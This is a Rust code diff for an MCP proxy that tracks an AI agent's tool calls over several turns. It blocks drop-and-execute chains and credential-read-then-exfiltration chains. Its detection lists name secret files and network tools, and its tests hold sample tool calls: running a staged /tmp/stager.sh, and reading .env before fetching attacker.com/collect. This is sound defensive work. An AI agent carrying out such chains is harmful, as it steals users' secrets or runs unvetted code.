@@ -30,6 +30,221 @@ pub struct McpAuditReport {
     pub clean: bool,
 }
 
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct ToolCallRecord {
+    pub timestamp: i64,
+    pub tool_name: String,
+    pub arguments: serde_json::Value,
+    pub target_paths: Vec<String>,
+    pub is_write: bool,
+    pub is_execution: bool,
+    pub is_sensitive_read: bool,
+    pub is_network_outbound: bool,
+}
+
+#[derive(Debug, Clone)]
+pub struct McpSessionTracker {
+    pub history: Vec<ToolCallRecord>,
+    pub max_history: usize,
+}
+
+impl Default for McpSessionTracker {
+    fn default() -> Self {
+        Self {
+            history: Vec::new(),
+            max_history: 50,
+        }
+    }
+}
+
+impl McpSessionTracker {
+    pub fn new(max_history: usize) -> Self {
+        Self {
+            history: Vec::new(),
+            max_history,
+        }
+    }
+
+    /// Recursively extract file target paths from tool call arguments
+    pub fn extract_paths_from_json(val: &serde_json::Value) -> Vec<String> {
+        let mut paths = Vec::new();
+        match val {
+            serde_json::Value::Object(map) => {
+                for (k, v) in map {
+                    let k_lower = k.to_lowercase();
+                    if k_lower.contains("path")
+                        || k_lower.contains("file")
+                        || k_lower.contains("target")
+                        || k_lower.contains("dest")
+                    {
+                        if let Some(s) = v.as_str() {
+                            paths.push(s.to_string());
+                        }
+                    } else if k_lower.contains("command")
+                        || k_lower.contains("cmd")
+                        || k_lower.contains("script")
+                    {
+                        if let Some(cmd) = v.as_str() {
+                            for word in cmd.split_whitespace() {
+                                let w = word.trim_matches(|c| c == '\'' || c == '"' || c == ';');
+                                if w.starts_with('/')
+                                    || w.starts_with("./")
+                                    || w.starts_with("../")
+                                    || w.ends_with(".sh")
+                                    || w.ends_with(".py")
+                                    || w.ends_with(".js")
+                                {
+                                    paths.push(w.to_string());
+                                }
+                            }
+                        }
+                    }
+                    paths.extend(Self::extract_paths_from_json(v));
+                }
+            }
+            serde_json::Value::Array(arr) => {
+                for item in arr {
+                    paths.extend(Self::extract_paths_from_json(item));
+                }
+            }
+            serde_json::Value::String(s) => {
+                let w = s.trim_matches(|c| c == '\'' || c == '"');
+                if w.starts_with('/') || w.starts_with("./") || w.starts_with("../") {
+                    paths.push(w.to_string());
+                }
+            }
+            _ => {}
+        }
+        paths
+    }
+
+    /// Classify and record tool invocation, evaluating against multi-turn attack patterns
+    pub fn record_and_evaluate(
+        &mut self,
+        tool_name: &str,
+        args_val: &serde_json::Value,
+    ) -> Result<(), Box<VulnerabilityFinding>> {
+        let now = chrono::Utc::now().timestamp();
+        let name_lower = tool_name.to_lowercase();
+        let args_str = args_val.to_string().to_lowercase();
+        let extracted_paths = Self::extract_paths_from_json(args_val);
+
+        let is_write = name_lower.contains("write")
+            || name_lower.contains("create")
+            || name_lower.contains("edit")
+            || args_str.contains(" > ")
+            || args_str.contains(" >> ")
+            || args_str.contains("tee ")
+            || args_str.contains("cat <<");
+
+        let is_execution = name_lower.contains("command")
+            || name_lower.contains("bash")
+            || name_lower.contains("sh")
+            || name_lower.contains("exec")
+            || name_lower.contains("terminal")
+            || name_lower.contains("run")
+            || args_str.contains("chmod")
+            || args_str.contains("bash ")
+            || args_str.contains("python ")
+            || args_str.contains("./");
+
+        let is_sensitive_read = (name_lower.contains("read")
+            || name_lower.contains("fetch")
+            || name_lower.contains("cat")
+            || name_lower.contains("open"))
+            && (args_str.contains(".env")
+                || args_str.contains("/etc/shadow")
+                || args_str.contains("/etc/passwd")
+                || args_str.contains("id_rsa")
+                || args_str.contains(".ssh")
+                || args_str.contains("credentials"));
+
+        let is_network_outbound = name_lower.contains("fetch")
+            || name_lower.contains("http")
+            || name_lower.contains("curl")
+            || name_lower.contains("upload")
+            || name_lower.contains("send_message")
+            || args_str.contains("curl ")
+            || args_str.contains("wget ")
+            || args_str.contains("fetch(")
+            || args_str.contains("requests.post");
+
+        // Rule NW-MCP-005: Stateful Drop-and-Execute Chain
+        // Attack Pattern: Tool writes a file (e.g. /tmp/stager.sh), and a subsequent tool turn executes it or marks it executable.
+        if is_execution {
+            for past in self.history.iter().rev().take(10) {
+                if past.is_write {
+                    for written_path in &past.target_paths {
+                        let file_stem = std::path::Path::new(written_path)
+                            .file_name()
+                            .and_then(|f| f.to_str())
+                            .unwrap_or(written_path);
+
+                        if !file_stem.is_empty()
+                            && (args_str.contains(written_path) || args_str.contains(file_stem))
+                        {
+                            return Err(Box::new(VulnerabilityFinding {
+                                rule_id: "NW-MCP-005".to_string(),
+                                title: "Stateful Multi-Turn Attack Chain: Staged Drop-and-Execute".to_string(),
+                                category: RuleCategory::SystemExecution,
+                                severity: SastSeverity::Critical,
+                                file_path: Some(format!("mcp:{}", tool_name)),
+                                line_number: None,
+                                matched_snippet: format!(
+                                    "Turn A: wrote '{}' -> Turn B: executed with args: '{}'",
+                                    written_path,
+                                    args_str.chars().take(80).collect::<String>()
+                                ),
+                                recommendation: "Block multi-turn drop-and-execute sequence; executing unverified dynamically written scripts is prohibited.".to_string(),
+                            }));
+                        }
+                    }
+                }
+            }
+        }
+
+        // Rule NW-MCP-006: Stateful Multi-Turn Exfiltration Chain
+        // Attack Pattern: Tool reads a sensitive credential/secret file, and a subsequent tool turn initiates outbound network communication.
+        if is_network_outbound {
+            for past in self.history.iter().rev().take(10) {
+                if past.is_sensitive_read {
+                    return Err(Box::new(VulnerabilityFinding {
+                        rule_id: "NW-MCP-006".to_string(),
+                        title: "Stateful Multi-Turn Attack Chain: Sensitive Read to Outbound Exfiltration".to_string(),
+                        category: RuleCategory::SecretLeak,
+                        severity: SastSeverity::Critical,
+                        file_path: Some(format!("mcp:{}", tool_name)),
+                        line_number: None,
+                        matched_snippet: format!(
+                            "Turn A: sensitive read in '{}' -> Turn B: outbound request in '{}'",
+                            past.tool_name, tool_name
+                        ),
+                        recommendation: "Block multi-turn exfiltration chain; outbound network transfer immediately following credential file read detected.".to_string(),
+                    }));
+                }
+            }
+        }
+
+        // Record the tool call in sliding history
+        self.history.push(ToolCallRecord {
+            timestamp: now,
+            tool_name: tool_name.to_string(),
+            arguments: args_val.clone(),
+            target_paths: extracted_paths,
+            is_write,
+            is_execution,
+            is_sensitive_read,
+            is_network_outbound,
+        });
+
+        if self.history.len() > self.max_history {
+            self.history.remove(0);
+        }
+
+        Ok(())
+    }
+}
+
 /// Audit an MCP configuration file (.agents/mcp_config.json) for security vulnerabilities
 pub fn audit_mcp_config(config_path: &Path) -> Result<McpAuditReport, Box<dyn std::error::Error>> {
     let raw = fs::read_to_string(config_path)?;
@@ -80,16 +295,20 @@ pub fn audit_mcp_config(config_path: &Path) -> Result<McpAuditReport, Box<dyn st
     })
 }
 
-/// Inspect a runtime JSON-RPC Model Context Protocol payload
-pub fn inspect_mcp_json_rpc(payload: &str) -> Result<(), Box<VulnerabilityFinding>> {
+/// Inspect a runtime JSON-RPC Model Context Protocol payload with stateful session tracking
+pub fn inspect_mcp_json_rpc_stateful(
+    payload: &str,
+    tracker: &mut McpSessionTracker,
+) -> Result<(), Box<VulnerabilityFinding>> {
     if let Ok(val) = serde_json::from_str::<serde_json::Value>(payload) {
         let method = val["method"].as_str().unwrap_or("");
 
         if method == "tools/call" {
             let tool_name = val["params"]["name"].as_str().unwrap_or("unknown");
-            let args_str = val["params"]["arguments"].to_string();
+            let args_val = &val["params"]["arguments"];
+            let args_str = args_val.to_string();
 
-            // Run SAST scan on serialized tool call arguments
+            // 1. Run SAST scan on serialized tool call arguments
             let findings = sast::scan_content(&args_str, Some(tool_name));
             if let Some(critical) = findings
                 .into_iter()
@@ -97,6 +316,9 @@ pub fn inspect_mcp_json_rpc(payload: &str) -> Result<(), Box<VulnerabilityFindin
             {
                 return Err(Box::new(critical));
             }
+
+            // 2. Stateful multi-turn attack chain evaluation
+            tracker.record_and_evaluate(tool_name, args_val)?;
         } else if method == "resources/read" {
             let uri = val["params"]["uri"].as_str().unwrap_or("");
             if uri.contains("/etc/shadow") || uri.contains("/etc/passwd") || uri.contains("id_rsa")
@@ -120,12 +342,19 @@ pub fn inspect_mcp_json_rpc(payload: &str) -> Result<(), Box<VulnerabilityFindin
     Ok(())
 }
 
-/// Transform incoming JSON-RPC line from client, intercepting and blocking hostile tool invocations
-pub fn process_client_mcp_line(
+/// Inspect a runtime JSON-RPC Model Context Protocol payload (stateless convenience wrapper)
+pub fn inspect_mcp_json_rpc(payload: &str) -> Result<(), Box<VulnerabilityFinding>> {
+    let mut tracker = McpSessionTracker::default();
+    inspect_mcp_json_rpc_stateful(payload, &mut tracker)
+}
+
+/// Transform incoming JSON-RPC line from client with stateful multi-turn tracking
+pub fn process_client_mcp_line_stateful(
     line: &str,
     sanitize: bool,
+    tracker: &mut McpSessionTracker,
 ) -> Result<String, (serde_json::Value, Box<VulnerabilityFinding>)> {
-    match inspect_mcp_json_rpc(line) {
+    match inspect_mcp_json_rpc_stateful(line, tracker) {
         Ok(()) => {
             if sanitize {
                 let (sanitized, _) = sast::sanitize_secrets(line);
@@ -161,6 +390,15 @@ pub fn process_client_mcp_line(
             Err((err_resp, finding))
         }
     }
+}
+
+/// Transform incoming JSON-RPC line from client, intercepting and blocking hostile tool invocations
+pub fn process_client_mcp_line(
+    line: &str,
+    sanitize: bool,
+) -> Result<String, (serde_json::Value, Box<VulnerabilityFinding>)> {
+    let mut tracker = McpSessionTracker::default();
+    process_client_mcp_line_stateful(line, sanitize, &mut tracker)
 }
 
 /// Transform outgoing JSON-RPC line from server to client, redacting secrets in-flight
@@ -204,6 +442,7 @@ pub async fn run_mcp_proxy(
     let stdin_task = tokio::spawn(async move {
         let stdin = tokio::io::stdin();
         let mut reader = BufReader::new(stdin).lines();
+        let mut tracker = McpSessionTracker::default();
 
         while let Ok(Some(line)) = reader.next_line().await {
             let line_trimmed = line.trim();
@@ -211,7 +450,7 @@ pub async fn run_mcp_proxy(
                 continue;
             }
 
-            match process_client_mcp_line(line_trimmed, sanitize) {
+            match process_client_mcp_line_stateful(line_trimmed, sanitize, &mut tracker) {
                 Ok(forward_line) => {
                     if let Err(e) = child_stdin
                         .write_all(format!("{forward_line}\n").as_bytes())
@@ -435,5 +674,60 @@ mod tests {
         let sanitized = process_server_mcp_line(line, true);
         assert!(!sanitized.contains("AKIAIOSFODNN7EXAMPLE"));
         assert!(sanitized.contains("AKIA***REDACTED***MPLE"));
+    }
+
+    #[test]
+    fn test_stateful_mcp_tracker_drop_and_execute_blocked() {
+        let mut tracker = McpSessionTracker::default();
+
+        // Turn 1: Benign write of a script to /tmp/stager.sh
+        let turn1 = r#"{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"write_file","arguments":{"path":"/tmp/stager.sh","content":"echo hello"}}}"#;
+        let res1 = process_client_mcp_line_stateful(turn1, false, &mut tracker);
+        assert!(res1.is_ok(), "Turn 1 write should be allowed");
+
+        // Turn 2: Attempting to execute the staged file
+        let turn2 = r#"{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"run_command","arguments":{"command":"bash /tmp/stager.sh"}}}"#;
+        let res2 = process_client_mcp_line_stateful(turn2, false, &mut tracker);
+        assert!(
+            res2.is_err(),
+            "Turn 2 execution of staged file must be blocked"
+        );
+        let (_, finding) = res2.unwrap_err();
+        assert_eq!(finding.rule_id, "NW-MCP-005");
+        assert_eq!(finding.severity, SastSeverity::Critical);
+    }
+
+    #[test]
+    fn test_stateful_mcp_tracker_sensitive_read_to_exfiltration_blocked() {
+        let mut tracker = McpSessionTracker::default();
+
+        // Turn 1: Read sensitive credentials
+        let turn1 = r#"{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"read_file","arguments":{"path":".env"}}}"#;
+        let res1 = process_client_mcp_line_stateful(turn1, false, &mut tracker);
+        assert!(res1.is_ok(), "Reading .env is recorded");
+
+        // Turn 2: Subsequent outbound network transmission
+        let turn2 = r#"{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"fetch","arguments":{"url":"https://attacker.com/collect"}}}"#;
+        let res2 = process_client_mcp_line_stateful(turn2, false, &mut tracker);
+        assert!(
+            res2.is_err(),
+            "Outbound exfiltration after credential read must be blocked"
+        );
+        let (_, finding) = res2.unwrap_err();
+        assert_eq!(finding.rule_id, "NW-MCP-006");
+        assert_eq!(finding.severity, SastSeverity::Critical);
+    }
+
+    #[test]
+    fn test_stateful_mcp_tracker_benign_multi_turn_allowed() {
+        let mut tracker = McpSessionTracker::default();
+
+        // Turn 1: Read code
+        let turn1 = r#"{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"read_file","arguments":{"path":"src/main.rs"}}}"#;
+        assert!(process_client_mcp_line_stateful(turn1, false, &mut tracker).is_ok());
+
+        // Turn 2: Run test suite
+        let turn2 = r#"{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"run_command","arguments":{"command":"cargo test"}}}"#;
+        assert!(process_client_mcp_line_stateful(turn2, false, &mut tracker).is_ok());
     }
 }
